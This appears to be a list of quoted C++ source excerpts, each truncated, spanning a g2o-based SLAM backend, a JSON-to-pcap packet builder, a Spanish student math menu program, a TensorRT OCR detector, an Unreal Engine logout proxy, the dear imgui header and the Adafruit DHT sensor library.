    "#include \"myslam/Backend.h\"\n#include \"myslam/GeometricAlgorithm.h\"\n#include \"myslam/Feature.h\"\n#include \"myslam/GraphUtils.h\"\n#include \"myslam/Map.h\"\n#include \"myslam/MapPoint.h\"\nnamespace myslam\n{\n    // \u6784\u9020\u51fd\u6570\u4e2d\u542f\u52a8\u4f18\u5316\u7ebf\u7a0b\u5e76\u6302\u8d77\n    Backend::Backend()\n    {\n        backend_running_.store(true);\n\n        // \u542f\u52a8\u540e\u7aef\u4f18\u5316\u7ebf\u7a0b\n        // \u4e3a\u4ec0\u4e48bind\u8981\u7528this? \u672c\u4eba\u7684\u7406\u89e3\u662f: bind\u7ed1\u5b9a\u5bf9\u8c61\u51fd\u6570\u65f6, \u9700\u8981\u4f20\u5165\u4e00\u4e2a\u6307\u5411\u5bf9\u8c61\u672c\u8eab\u7684\u6307\u9488\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570\u3002\n        backend_thread_ = std::thread(std::bind(&Backend::BackendLoop, this));\n    }\n\n    // \u540e\u7aef\u7ebf\u7a0b\n    void Backend::BackendLoop()\n    {\n        // \u4f7f\u7528atomic.load()\u8bfb\u53d6\u539f\u5b50\u6570\u636e\n        while(backend_running_.load())\n        {\n            std::unique_lock<std::mutex> lock(data_mutex_);\n            map_update_.wait(lock);\n\n            Map::KeyframesType active_kfs = map_->GetActiveKeyframes();\n            Map::LandmarksType active_landmarks = map_->GetActiveMapPoints();\n\n            Optimize(active_kfs, active_landmarks);\n        }\n    }\n\n    // \u89e6\u53d1\u5730\u56fe\u66f4\u65b0, \u542f\u52a8\u4f18\u5316\n    void Backend::UpdateMap()\n    {\n        std::unique_lock<std::mutex> lock(data_mutex_);\n        // \u53d1\u51fa\u4fe1\u53f7, \u9700\u8981\u66f4\u65b0\u4e86\n        map_update_.notify_one();\n    }\n    // \u5173\u95ed\u540e\u7aef\u7ebf\u7a0b\n    void Backend::Stop()\n    {\n        backend_running_.store(false);\n        // \u5173\u95ed\u4e4b\u524d\u518d\u8fdb\u884c\u4e00\u6b21update\n        map_update_.notify_one();\n        backend_thread_.join();\n    }\n\n\n\n    // \u4f18\u5316\u7ed9\u5b9a\u7684\u5173\u952e\u5e27\u548c\u8def\u6807\u70b9\n    void Backend::Optimize(Map::KeyframesType &keyframes, Map::LandmarksType &landmarks)\n    {\n        typedef g2o::BlockSolver_6_3 BlockSolvertype;\n        typedef g2o::LinearSolverCSparse<BlockSolvertype::PoseMatrixType> LinearSolverType;\n        auto solver = new g2o::OptimizationAlgorithmLevenberg(g2o::make_unique<BlockSolvertype>(g2o::make_unique<LinearSolverType>()));\n        g2o::SparseOptimizer optimizer;\n        optimizer.setAlgorithm(solver);\n\n        // \u5c06keyframe\u653e\u5165\u9876\u70b9\u8868\u4e2d\n        std::map<unsigned long, VertexPose *> vertices;\n\n        // \u6700\u5927\u7684\u5173\u952e\u5e27id\n        unsigned long max_kf_id = 0;\n        for(auto &keyframe : keyframes)\n        {\n            auto kf = keyframe.second;\n            VertexPose *vertex_pose = new VertexPose();\n\n            // \u8981\u6ce8\u610f\u5b9a\u70b9\u5bf9\u5e94\u7684id\u662f\u5173\u952e\u5e27id\n            vertex_pose->setId(kf->keyframe_id_);\n            vertex_pose->setEstimate(kf->pose());\n            if(kf->keyframe_id_ > max_kf_id)\n            {\n                max_kf_id = kf->keyframe_id_;\n            }\n            vertices.insert({kf->keyframe_id_, vertex_pose});\n        }\n\n        // K\u548c\u5de6\u53f3\u5916\u53c2. \u6b64\u5904\u7684\u5916\u53c2\u662f\u76f8\u5bf9\u4e8e\u76f8\u673a\u672c\u8eabpose\u7684\u6295\u5f71\u77e9\u9635, \u4ec5\u542b\u6709\u4e00\u4e2at\n        Mat33 K = cam_left_->K();\n        SE3 left_ext = cam_left_->pose();\n        SE3 right_ext = cam_right_->pose();\n        // \u8fb9\n        int index = 1;\n        double chi2_th = 5.991;     // robust kernel \u9608\u503c\n\n        // \u8def\u6807\u9876\u70b9\n        std::map<unsigned long, VertexXYZ*> vertices_landmarks;\n        // \u5c06\u7279\u5f81\u70b9\u548c\u8fb9\u653e\u5728\u4e00\u8d77\u7d22\u5f15\u3002\u8fd9\u6837\u505a\u7684\u76ee\u7684\u662f\u65b9\u4fbf\u540e\u9762\u79bb\u7fa4\u70b9\u7684\u5254\u9664\n        std::map<EdgeProjection*, Feature::Ptr> edges_and_features;\n    \n        for(auto &landmark : landmarks)\n        {\n            // \u8fc7\u6ee4\u79bb\u7fa4\u70b9\n            if(landmark.second->is_outlier_) continue;\n\n            unsigned long landmark_id = landmark.second->id_;\n\n            // \u83b7\u53d6observation, \u5373\u4e0e\u8be5\u8def\u6807\u70b9\u6709\u5173\u7684feature\n            auto observations = landmark.second->GetObs();\n\n            // \u904d\u5386observation\n            for(auto &obs : observations)\n            {\n                if(obs.lock()==nullptr) continue;       // \u5bf9\u4e8eweak_ptr\u4e00\u5b9a\u8981\u62fflock()\u68c0\u9a8c\n\n                auto feat = obs.lock();\n\n                // \u68c0\u6d4b\u8be5\u7279\u5f81\u662f\u5426\u4e3a\u79bb\u7fa4\u70b9\n                if(feat->is_outlier_ || feat->frame_.lock() == nullptr) continue;\n                // observation\u5bf9\u5e94\u7684frame\n                auto frame = feat->frame_.lock();\n                EdgeProjection *edge = nullptr;\n\n                // \u6839\u636e\u5de6\u53f3\u76f8\u673a\u786e\u5b9aEdge\u4f20\u5165\u7684\u76f8\u673a\u5916\u53c2\n                if(feat->is_on_left_image_)\n                {\n                    edge = new EdgeProjection(K, left_ext);\n                } else {\n                    edge = new EdgeProjection(K, right_ext);\n                }\n\n                // \u5982\u679clandmark\u8fd8\u6ca1\u88ab\u52a0\u5165\u4f18\u5316, \u5219\u52a0\u5165landmarks\u9876\u70b9\n                if(vertices_landmarks.find(landmark_id) == vertices_landmarks.end())\n                {\n                    VertexXYZ *v = new VertexXYZ;\n                    // \u5bf9\u4e8e\u8def\u6807\u6765\u8bf4, observation\u5c31\u662f\u5750\u6807\n                    v->setEstimate(landmark.second->Pos());\n                    /**\n                     * Pose1 max_kf_id landmark1\n                     * |             | |\n                     * [][][][][]...[]()()()()...()\n                     */\n                    v->setId(landmark_id + max_kf_id + 1);\n                    v->setMarginalized(true);\n                    vertices_landmarks.insert({landmark_id, v});\n                    optimizer.addVertex(v);\n                }\n\n                // \u8bbe\u7f6e\u8fb9\n                if(vertices.find(frame->keyframe_id_)!=vertices.end() && vertices_landmarks.find(landmark_id)!=vertices_landmarks.end())\n                {\n                    edge->setId(index);\n                    edge->setVertex(0, vertices.at(frame->keyframe_id_));\n                    edge->setVertex(1, vertices_landmarks.at(landmark_id));\n                    edge->setMeasurement(toVec2(fea",
    "#define SPDLOG_ACTIVE_LEVEL SPDLOG_LEVEL_TRACE\n\n#include <Binary.hpp>\n#include <EntityService.hpp>\n#include <Ethernet.hpp>\n#include <Ipv4.hpp>\n#include <PacketBuilder.hpp>\n#include <PacketService.hpp>\n#include <PcapFileHeader.hpp>\n#include <PcapPacketHeader.hpp>\n#include <Stackable.hpp>\n#include <Udp.hpp>\n#include <arpa/inet.h>\n#include <boost/format.hpp>\n#include <cmdline/cmdline.h>\n#include <cstring>\n#include <fstream>\n#include <iostream>\n#include <pcap.h>\n#include <spdlog/spdlog.h>\n\nint main(int argc, char **argv)\n{\n    spdlog::set_level(spdlog::level::trace);\n\n    Options options;\n    try\n    {\n        auto parser = GetArgumentParser();\n        ParseArguments(options, argc, argv, parser);\n        ValidateOptions(options);\n    }\n    catch (const std::exception &e)\n    {\n        SPDLOG_ERROR(e.what());\n        return 1;\n    }\n\n    spdlog::set_level(options.LogLevel.Value());\n\n    auto inputFilename = options.InputFilename.Value();\n    auto inputStream = std::ifstream(inputFilename);\n    auto inputJson = nlohmann::json::parse(inputStream);\n    auto entities = PacketEntity::EntityService::ParseEntities(inputJson);\n\n    std::vector<Packet::StackablePtr> stackables;\n    std::transform(\n        entities.begin(), entities.end(), std::back_inserter(stackables),\n        [](PacketEntity::StackableEntityPtr entity) { return Packet::PacketService::StackableFromEntity(entity); });\n\n    if (options.OutputFileType.Value() == FileType::None)\n    {\n        return 0;\n    }\n\n    auto actions = std::map<FileType, std::function<void(void)>>{\n        {FileType::Pcap,\n         [&]() {\n             auto fmt = boost::format(\"Output to pcap file: %1%\");\n             auto msg = fmt % options.OutputFilename.Value();\n             SPDLOG_INFO(msg.str());\n\n             SaveAsPcap(options.OutputFilename.Value(), stackables);\n         }},\n    };\n    auto actionItr = actions.find(options.OutputFileType.Value());\n    if (actionItr == actions.end())\n    {\n        SPDLOG_ERROR(\"Invalid output file type\");\n        return 1;\n    }\n    actionItr->second();\n\n    return 0;\n}\n",
    "#include <iostream>\nusing namespace std;\n#include <stdio.h>     \n#include <stdlib.h>    \n#include <time.h>  \n#include <math.h>   \n\nint factorial(int numero)\n{\n\t// funcion encargada de ir sacando el factorial acumulandose\n\t//  para sacar el resultado final hasta que el valor llegue a ser menor que 2\n\tif (numero < 2) {\n\t\treturn 1;\n\t}\n\telse {\n\t\t// formula de factorial\n\t\treturn numero * factorial(numero - 1);\n\t}\n}\n\nint codigo(int n, int r)\n{\n\tif (r == 1) {\n\t\treturn n;\n\t}\n\telse if (n == r) {\n\t\t\treturn 1;\n\t\t}\n\t\telse\n\t\t{\n\t\t/*\n\t\tformula:\t n!\n\t\t\t\t--------------\n\t\t\t\t(n! * (n! -r))\n\t\t*/\n\t\t\treturn factorial(n) / (factorial(r) * factorial(n - r));\n\t}\n}\n\nvoid triangulo_pascal(int rango) {\n\t// le quitamos uno para que lo imprima bien\n\trango--;\n\t// for para salto de linea \n\tfor (int i = 0; i <= rango; i++)\n\t{\n\t\t// for de impresion de numeros mas el espacio de separaciob\n\t\tfor (int j = 0; j < i; j++) {\n\t\t\tcout << codigo(i, j) << \" \" ;\n\t\t}\n\t\t// imprime en duro el uno porque no puede hacerlo de otra forma\n\t\t\tcout << \"1\" << endl;\n\t}\n}\n\nvoid ecuaciones_puntos() {\n\tsrand(time(NULL));\n\tint tamano = 2;\n\tdo {\n\t\tcout << \"Ingrese el tamano del arreglo que quiere generar: \";\n\t\tcin >> tamano;\n\t\tif (tamano < 2)\n\t\t{\n\t\t\tcout << \"Cuidado no puede ser menor que 2\" << endl;\n\t\t}\n\t\t//llena los arreglos con numeros ramdoms\n\t} while (tamano < 2);\n\tint* arreglo1 = new int[tamano];\n\tfor (size_t i = 0; i < tamano; i++)\n\t{\n\t\tarreglo1[i] = rand() % 20 + 1;\n\t}\n\tint* arreglo2 = new int[tamano];\n\tfor (size_t i = 0; i < tamano; i++)\n\t{\n\t\tarreglo2[i] = rand() % 20 + 1;\n\t}\n\tcout << \"Puntos en X generados : [ \";\n\t//los imprime\n\tfor (size_t i = 0; i < tamano; i++)\n\t{\n\t\tcout << arreglo1[i] << \" \";\n\t}\n\tcout << \"]\" << endl;\n\tcout << \"Puntos en Y generados : [ \";\n\tfor (size_t i = 0; i < tamano; i++)\n\t{\n\t\tcout << arreglo2[i] << \" \";\n\t}\n\tcout << \"]\" << endl;\n\t//consigue la posicion que solicita el usuario\n\tint punto1 = 1, punto2 = 2;\n\tdo {\n\t\tcout << \"Ingrese la posicion del punto 1: \";\n\t\tcin >> punto1;\n\t} while (punto1 < 0 || punto1 > tamano);\n\tdo {\n\t\tcout << \"Ingrese la posicion del punto 2: \";\n\t\tcin >> punto2;\n\t} while (punto2 < 0 || punto2 > tamano);\n\t//les resta una ya que el arreglo empieza desde 0\n\tpunto1 = punto1 - 1;\n\tpunto2 = punto2 - 1;\n\tcout << \"Punto 1: \" <<\"(\" << arreglo1[punto1] << \" , \" << arreglo2[punto1] << \")\" << endl;\n\tcout << \"Punto 2: \" << \"(\" << arreglo1[punto2] << \" , \" << arreglo2[punto2] << \")\" << endl;\n\tdouble resultado;\n\t//formula para para calcular resultado\n\tresultado = (arreglo2[punto2] - arreglo2[punto1]) / (arreglo1[punto2] - arreglo1[punto1]);\n\tcout << \"La ecuacion de la recta que pasa por los 2 puntos es m = \" << resultado << endl;\n\tdelete[] arreglo1;\n\tdelete[] arreglo2;\n}\n\nvoid suma_vectores() {\n\t//inicia ramdom\n\tsrand(time(NULL));\n\tint tamano = 2;\n\tdo {\n\t\tcout << \"Ingrese el tamano del arreglo que quiere generar: \";\n\t\tcin >> tamano;\n\t\tif (tamano < 2)\n\t\t{\n\t\t\tcout << \"Cuidado no puede ser menor que 2\" << endl;\n\t\t}\n\t\t//inicia vector\n\t} while (tamano < 2);\n\tint* vector1 = new int[tamano];\n\tfor (size_t i = 0; i < tamano; i++)\n\t{\n\t\tvector1[i] = rand() % 20 + 1;\n\t}\n\tint* vector2 = new int[tamano];\n\tfor (size_t i = 0; i < tamano; i++)\n\t{\n\t\tvector2[i] = rand() % 20 + 1;\n\t}\n\tcout << \"Valores generados en vector 1 : [ \";\n\t// imprime vector\n\tfor (size_t i = 0; i < tamano; i++)\n\t{\n\t\tcout << vector1[i] << \" \";\n\t}\n\tcout << \"]\" << endl;\n\tcout << \"Valores generados en vector 2 : [ \";\n\tfor (size_t i = 0; i < tamano; i++)\n\t{\n\t\tcout << vector2[i] << \" \";\n\t}\n\tcout << \"]\" << endl;\n\t// vector donde se sumara los resultados\n\tdouble* vector3 = new double[tamano];\n\tfor (size_t i = 0; i < tamano; i++)\n\t{\n\t\tvector3[i] = vector1[i] + vector2[i];\n\t}\n\tcout << \"El resultado de la suma de vectores es: [ \";\n\tfor (size_t i = 0; i < tamano; i++)\n\t{\n\t\tcout << vector3[i] << \" \";\n\t}\n\tcout << \"]\" << endl;\n\tdouble elevado, resultado = 0;\n\tfor (size_t i = 0; i < tamano; i++)\n\t{\n\t\televado = pow(vector3[i], 2);\n\t\tresultado = resultado + elevado;\n\t}\n\tresultado = sqrt(resultado);\n\tcout << \"La norma de la suma de los vectores 1 y 2 es: \" << resultado << endl;\n\tdelete[] vector1;\n\tdelete[] vector2;\n\tdelete[] vector3;\n}\n\nvoid operaciones() {\n\tint opciones_operaciones = 0;\n\twhile (opciones_operaciones != 3)\n\t{\n\t\tcout << \"---- MENU ----\" << endl << \"1. Ecuaciones de la recta que pasa por 2 puntos\" <<\n\t\t\t endl <<\"2. Suma de vectores y su norma\" << endl << \"3. Salir\" << endl << \"Cual desea elegir: \";\n\t\tcin >> opciones_operaciones;\n\t\tcout << endl;\n\t\tswitch (opciones_operaciones)\n\t\t{\n\t\tcase 1: {\n\t\t\tecuaciones_puntos();\n\t\t\tbreak;\n\t\t}\n\t\tcase 2: {\n\t\t\tsuma_vectores();\n\t\t\tbreak;\n\t\t}\n\t\tcase 3: {\n\t\t\tcout << \"Regresando...\" << endl;\n\t\t\tbreak;\n\t\t}\n\t\tdefault:\n\t\t\tcout << \"Caracter invalido, porfavor vuelva a intentarlo\";\n\t\t\tbreak;\n\t\t}\n\t}\n}\n\nvoid menu() {\n\n\tint *opciones = new int;\n\t*opciones = 1;\n\twhile (*opciones != 3)\n\t{\n\t\tcout << \"---- MENU ----\" << endl << \"1. Triangulo de Pascal \" << endl <<\n\t\t\t\"2. Operaciones de numero\" << endl << \"3. Salir\" << endl <<\n\t\t\t\"Cual desea elegir: \";\n\t\tcin >> *",
    "#include \"det.h\"\n\nnamespace OCR {\n\n    void TextDetect::Model_Init(std::string_view det_engine_path, std::string_view det_onnx_path) {\n        bool succ = false;\n        if (!det_engine_path.empty()) {\n            if (Util::doesFileExist(det_engine_path.data())) {\n                succ = this->loadNetwork(det_engine_path.data());\n                if (!succ) {\n                    throw std::runtime_error(\"Unable to build or load TensorRT engine.\");\n                }\n            }\n        }\n\n        if (!succ) {\n            if (!det_onnx_path.empty() && Util::doesFileExist(det_onnx_path.data())) {\n                succ = buildLoadNetwork(det_onnx_path.data());\n            }\n            if (!succ) {\n                throw std::runtime_error(\"Unable to build or load TensorRT engine.\");\n            }\n        }\n    }\n\n    uint32_t TextDetect::getMaxOutputLength(nvinfer1::Dims tensorShape) const {\n        return m_options.MAX_DIMS_[2] * m_options.MAX_DIMS_[3];\n    }\n\n    void TextDetect::Model_Infer(const cv::cuda::GpuMat& gpuImg, vector<vector<vector<int>>>& boxes, vector<double>* times) {\n\n        ////////////////////// preprocess ////////////////////////\n        float ratio_h{}; // = resize_h / h\n        float ratio_w{}; // = resize_w / w\n\n        auto preprocess_start = std::chrono::steady_clock::now();\n        cv::cuda::GpuMat resizedImg;\n\n        // cpu resize result different from gpu resize, take care.\n        /*cv::Mat tmp;\n        cv::Mat img;\n        gpuImg.download(img);\n        ResizeImgType0_Cpu resize_op_cpu;\n        resize_op_cpu.Run(img, tmp, this->max_side_len_, ratio_h, ratio_w);\n        resizedImg.upload(tmp);*/\n\n        this->resize_op_.Run(gpuImg, resizedImg, this->max_side_len_, ratio_h, ratio_w);\n\n        this->normalize_op_.Run(resizedImg, this->mean_, this->scale_, true);\n        this->permute_op_.Run(resizedImg);\n\n        size_t batchSize = m_options.optBatchSize;\n        auto preprocess_end = std::chrono::steady_clock::now();\n\n        auto inference_start = std::chrono::steady_clock::now();\n        cudaStream_t inferenceCudaStream;\n        Util::checkCudaErrorCode(cudaStreamCreate(&inferenceCudaStream));\n\n        const auto numInputs = m_inputDims.size();\n        // Preprocess all the inputs\n\n        nvinfer1::Dims4 inputDims2 = { (int64_t)batchSize, 3, resizedImg.rows, resizedImg.cols };\n        m_context->setInputShape(m_IOTensorNames[0].c_str(), inputDims2);\n\n        m_buffers[0] = resizedImg.ptr<void>(0);\n\n        if (!m_context->allInputDimensionsSpecified()) {\n            auto msg = \"Error, not all required dimensions specified.\";\n            spdlog::error(msg);\n            throw std::runtime_error(msg);\n        }\n        //Util::checkCudaErrorCode(cudaMallocAsync(&m_buffers[1], resizedImg.rows* resizedImg.cols * sizeof(float), inferenceCudaStream));\n\n        // Set the address of the input and output buffers\n        for (size_t i = 0; i < m_buffers.size(); ++i) {\n            bool status = m_context->setTensorAddress(m_IOTensorNames[i].c_str(), m_buffers[i]);\n            if (!status) {\n                return;\n            }\n        }\n\n\n        // m_context->setBindingDimensions(inputIndex, in_dims); // \u6839\u636e\u8f93\u5165\u56fe\u50cf\u5927\u5c0f\u66f4\u65b0\u8f93\u5165\u7ef4\n        m_context->enqueueV3(inferenceCudaStream);\n\n        cv::cuda::GpuMat result(resizedImg.rows, resizedImg.cols, CV_32FC1, m_buffers[1]);\n\n        cv::Mat pred;\n        result.download(pred);\n\n        cv::Mat bitmap;\n\n        cv::threshold(pred, bitmap, det_db_thresh_, 1, cv::THRESH_BINARY);\n\n        bitmap.convertTo(bitmap, CV_8UC1, 255.0f);\n\n        //cv::imwrite(\"test1.png\", bitmap);\n\n        // Synchronize the cuda stream\n        Util::checkCudaErrorCode(cudaStreamSynchronize(inferenceCudaStream));\n        //Util::checkCudaErrorCode(cudaFreeAsync(m_buffers[1], inferenceCudaStream));\n        Util::checkCudaErrorCode(cudaStreamDestroy(inferenceCudaStream));\n\n        auto inference_end = std::chrono::steady_clock::now();\n\n        ///////////////////// postprocess //////////////////////\n        auto postprocess_start = std::chrono::steady_clock::now();\n\n        boxes = post_processor_.BoxesFromBitmap(pred, bitmap, this->det_db_box_thresh_, this->det_db_unclip_ratio_, this->use_polygon_score_);\n\n        boxes = post_processor_.FilterTagDetRes(boxes, ratio_h, ratio_w, gpuImg); // \u5c06resize_img\u4e2d\u5f97\u5230\u7684bbox \u6620\u5c04\u56desrcing\u4e2d\u7684bbox\n\n        /*cv::Mat showImg = img.clone();\n        for (auto &b : boxes) {\n\n            cv::Point2i lt = cv::Point2i(b[0][0], b[0][1]);\n            cv::Point2i rt = cv::Point2i(b[1][0], b[1][1]);\n            cv::Point2i rb = cv::Point2i(b[2][0], b[2][1]);\n            cv::Point2i lb = cv::Point2i(b[3][0], b[3][1]);\n\n            cv::line(showImg, lt, rt, cv::Scalar(0, 0, 255));\n            cv::line(showImg, rt, rb, cv::Scalar(0, 0, 255));\n            cv::line(showImg, rb, lb, cv::Scalar(0, 0, 255));\n            cv::line(showImg, lb, lt, cv::Scalar(0, 0, 255));\n        }\n\n        cv::imwrite(\"test.png\", showImg);*/\n        //std::cout << \"Detected boxes num: \" << ",
    "// Copyright 1998-2015 Epic Games, Inc. All Rights Reserved.\n\n#include \"LogoutUserCallbackProxy.h\"\n\n#include \"Online.h\"\n\n//////////////////////////////////////////////////////////////////////////\n// ULogoutUserCallbackProxy\n\nULogoutUserCallbackProxy::ULogoutUserCallbackProxy(const FObjectInitializer& ObjectInitializer)\n\t: Super(ObjectInitializer)\n\t, Delegate(FOnLogoutCompleteDelegate::CreateUObject(this, &ThisClass::OnCompleted))\n{\n}\n\nULogoutUserCallbackProxy* ULogoutUserCallbackProxy::LogoutUser(UObject* WorldContextObject, class APlayerController* PlayerController)\n{\n\tULogoutUserCallbackProxy* Proxy = NewObject<ULogoutUserCallbackProxy>();\n\tProxy->PlayerControllerWeakPtr = PlayerController;\n\tProxy->WorldContextObject = WorldContextObject;\n\treturn Proxy;\n}\n\nvoid ULogoutUserCallbackProxy::Activate()\n{\n\n\tif (!PlayerControllerWeakPtr.IsValid())\n\t{\n\t\tOnFailure.Broadcast();\n\t\treturn;\n\t}\n\n\tULocalPlayer* Player = Cast<ULocalPlayer>(PlayerControllerWeakPtr->Player);\n\n\tif (!Player)\n\t{\n\t\tOnFailure.Broadcast();\n\t\treturn;\n\t}\n\n\tFOnlineSubsystemBPCallHelperAdvanced Helper(TEXT(\"LogoutUser\"), GEngine->GetWorldFromContextObject(WorldContextObject.Get(), EGetWorldErrorMode::LogAndReturnNull));\n\n\tif (!Helper.OnlineSub)\n\t{\n\t\tOnFailure.Broadcast();\n\t\treturn;\n\t}\n\tauto Identity = Helper.OnlineSub->GetIdentityInterface();\n\n\tif (Identity.IsValid())\n\t{\n\t\tDelegateHandle = Identity->AddOnLogoutCompleteDelegate_Handle(Player->GetControllerId(), Delegate);\n\t\tIdentity->Logout(Player->GetControllerId());\n\t\treturn;\n\t}\n\n\t// Fail immediately\n\tOnFailure.Broadcast();\n}\n\nvoid ULogoutUserCallbackProxy::OnCompleted(int LocalUserNum, bool bWasSuccessful)\n{\n\n\tif (PlayerControllerWeakPtr.IsValid())\n\t{\n\t\tULocalPlayer* Player = Cast<ULocalPlayer>(PlayerControllerWeakPtr->Player);\n\n\t\tif (Player)\n\t\t{\n\t\t\tFOnlineSubsystemBPCallHelperAdvanced Helper(TEXT(\"LogoutUser\"), GEngine->GetWorldFromContextObject(WorldContextObject.Get(), EGetWorldErrorMode::LogAndReturnNull));\n\n\t\t\tif (!Helper.OnlineSub)\n\t\t\t{\n\t\t\t\tOnFailure.Broadcast();\n\t\t\t\treturn;\n\t\t\t}\n\t\t\tauto Identity = Helper.OnlineSub->GetIdentityInterface();\n\n\t\t\tif (Identity.IsValid())\n\t\t\t{\n\t\t\t\tIdentity->ClearOnLogoutCompleteDelegate_Handle(Player->GetControllerId(), DelegateHandle);\n\t\t\t}\n\t\t}\n\t}\n\n\tif (bWasSuccessful)\n\t{\n\t\tOnSuccess.Broadcast();\n\t}\n\telse\n\t{\n\t\tOnFailure.Broadcast();\n\t}\n}\n",
    "// dear imgui, v1.85 WIP\n// (main code and documentation)\n\n// Help:\n// - Read FAQ at http://dearimgui.org/faq\n// - Newcomers, read 'Programmer guide' below for notes on how to setup Dear ImGui in your codebase.\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// Read imgui.cpp for details, links and comments.\n\n// Resources:\n// - FAQ                   http://dearimgui.org/faq\n// - Homepage & latest     \n// ://github.com/ocornut/imgui\n// - Releases & changelog  https://github.com/ocornut/imgui/releases\n// - Gallery               https://github.com/ocornut/imgui/issues/4451 (please post your screenshots/video there!)\n// - Wiki                  https://github.com/ocornut/imgui/wiki (lots of good stuff there)\n// - Glossary              https://github.com/ocornut/imgui/wiki/Glossary\n// - Issues & support      https://github.com/ocornut/imgui/issues\n\n// Getting Started?\n// - For first-time users having issues compiling/linking/running or issues loading fonts:\n//   please post in https://github.com/ocornut/imgui/discussions if you cannot find a solution in resources above.\n\n// Developed by Omar Cornut and every direct or indirect contributors to the GitHub.\n// See LICENSE.txt for copyright and licensing details (standard MIT License).\n// This library is free but needs your support to sustain development and maintenance.\n// Businesses: you can support continued development via invoiced technical support, maintenance and sponsoring contracts. Please reach out to \"contact AT dearimgui.com\".\n// Individuals: you can support continued development via donations. See docs/README or web page.\n\n// It is recommended that you don't modify imgui.cpp! It will become difficult for you to update the library.\n// Note that 'ImGui::' being a namespace, you can add functions into the namespace from your own source files, without\n// modifying imgui.h or imgui.cpp. You may include imgui_internal.h to access internal data structures, but it doesn't\n// come with any guarantee of forward compatibility. Discussing your changes on the GitHub Issue Tracker may lead you\n// to a better solution or official support for them.\n\n/*\n\nIndex of this file:\n\nDOCUMENTATION\n\n- MISSION STATEMENT\n- END-USER GUIDE\n- PROGRAMMER GUIDE\n  - READ FIRST\n  - HOW TO UPDATE TO A NEWER VERSION OF DEAR IMGUI\n  - GETTING STARTED WITH INTEGRATING DEAR IMGUI IN YOUR CODE/ENGINE\n  - HOW A SIMPLE APPLICATION MAY LOOK LIKE\n  - HOW A SIMPLE RENDERING FUNCTION MAY LOOK LIKE\n  - USING GAMEPAD/KEYBOARD NAVIGATION CONTROLS\n- API BREAKING CHANGES (read me when you update!)\n- FREQUENTLY ASKED QUESTIONS (FAQ)\n  - Read all answers online: https://www.dearimgui.org/faq, or in docs/FAQ.md (with a Markdown viewer)\n\nCODE\n(search for \"[SECTION]\" in the code to find them)\n\n// [SECTION] INCLUDES\n// [SECTION] FORWARD DECLARATIONS\n// [SECTION] CONTEXT AND MEMORY ALLOCATORS\n// [SECTION] USER FACING STRUCTURES (ImGuiStyle, ImGuiIO)\n// [SECTION] MISC HELPERS/UTILITIES (Geometry functions)\n// [SECTION] MISC HELPERS/UTILITIES (String, Format, Hash functions)\n// [SECTION] MISC HELPERS/UTILITIES (File functions)\n// [SECTION] MISC HELPERS/UTILITIES (ImText* functions)\n// [SECTION] MISC HELPERS/UTILITIES (Color functions)\n// [SECTION] ImGuiStorage\n// [SECTION] ImGuiTextFilter\n// [SECTION] ImGuiTextBuffer\n// [SECTION] ImGuiListClipper\n// [SECTION] STYLING\n// [SECTION] RENDER HELPERS\n// [SECTION] MAIN CODE (most of the code! lots of stuff, needs tidying up!)\n// [SECTION] ERROR CHECKING\n// [SECTION] LAYOUT\n// [SECTION] SCROLLING\n// [SECTION] TOOLTIPS\n// [SECTION] POPUPS\n// [SECTION] KEYBOARD/GAMEPAD NAVIGATION\n// [SECTION] DRAG AND DROP\n// [SECTION] LOGGING/CAPTURING\n// [SECTION] SETTINGS\n// [SECTION] VIEWPORTS\n// [SECTION] PLATFORM DEPENDENT HELPERS\n// [SECTION] METRICS/DEBUGGER WINDOW\n\n*/\n\n//-----------------------------------------------------------------------------\n// DOCUMENTATION\n//-----------------------------------------------------------------------------\n\n/*\n\n MISSION STATEMENT\n =================\n\n - Easy to use to create code-driven and data-driven tools.\n - Easy to use to create ad hoc short-lived tools and long-lived, more elaborate tools.\n - Easy to hack and improve.\n - Minimize setup and maintenance.\n - Minimize state storage on user side.\n - Portable, minimize dependencies, run on target (consoles, phones, etc.).\n - Efficient runtime and memory consumption.\n\n Designed for developers and content-creators, not the typical end-user! Some of the current weaknesses includes:\n\n - Doesn't look fancy, doesn't animate.\n - Limited layout features, intricate layouts are typically crafted in code.\n\n\n END-USER GUIDE\n ==============\n\n - Double-click on title bar to collapse window.\n - Click upper right corner to close a window, available when 'bool* p_open' is passed to ImGui::Begin().\n - Click and drag on lower right corner to resize window (double-click to auto fit window to its contents).\n - Click and drag on any empty space to move window.",
    "/*!\n *  @file DHT.cpp\n *\n *  @mainpage DHT series of low cost temperature/humidity sensors.\n *\n *  @section intro_sec Introduction\n *\n *  This is a library for DHT series of low cost temperature/humidity sensors.\n *\n *  You must have Adafruit Unified Sensor Library library installed to use this\n * class.\n *\n *  Adafruit invests time and resources providing this open source code,\n *  please support Adafruit andopen-source hardware by purchasing products\n *  from Adafruit!\n *\n *  @section author Author\n *\n *  Written by Adafruit Industries.\n *\n *  @section license License\n *\n *  MIT license, all text above must be included in any redistribution\n */\n\n#include \"DHT.h\"\n\n#define MIN_INTERVAL 2000 /**< min interval value */\n#define TIMEOUT                                                                \\\n  UINT32_MAX /**< Used programmatically for timeout.                           \\\n                   Not a timeout duration. Type: uint32_t. */\n\n/*!\n *  @brief  Instantiates a new DHT class\n *  @param  pin\n *          pin number that sensor is connected\n *  @param  type\n *          type of sensor\n *  @param  count\n *          number of sensors\n */\nDHT::DHT(uint8_t pin, uint8_t type, uint8_t count) {\n  (void)count; // Workaround to avoid compiler warning.\n  _pin = pin;\n  _type = type;\n#ifdef __AVR\n  _bit = digitalPinToBitMask(pin);\n  _port = digitalPinToPort(pin);\n#endif\n  _maxcycles =\n      microsecondsToClockCycles(1000); // 1 millisecond timeout for\n                                       // reading pulses from DHT sensor.\n  // Note that count is now ignored as the DHT reading algorithm adjusts itself\n  // based on the speed of the processor.\n}\n\n/*!\n *  @brief  Setup sensor pins and set pull timings\n *  @param  usec\n *          Optionally pass pull-up time (in microseconds) before DHT reading\n *starts. Default is 55 (see function declaration in DHT.h).\n */\nvoid DHT::begin(uint8_t usec) {\n  // set up the pins!\n  pinMode(_pin, INPUT_PULLUP);\n  // Using this value makes sure that millis() - lastreadtime will be\n  // >= MIN_INTERVAL right away. Note that this assignment wraps around,\n  // but so will the subtraction.\n  _lastreadtime = millis() - MIN_INTERVAL;\n  DEBUG_PRINT(\"DHT max clock cycles: \");\n  DEBUG_PRINTLN(_maxcycles, DEC);\n  pullTime = usec;\n}\n\n/*!\n *  @brief  Read temperature\n *  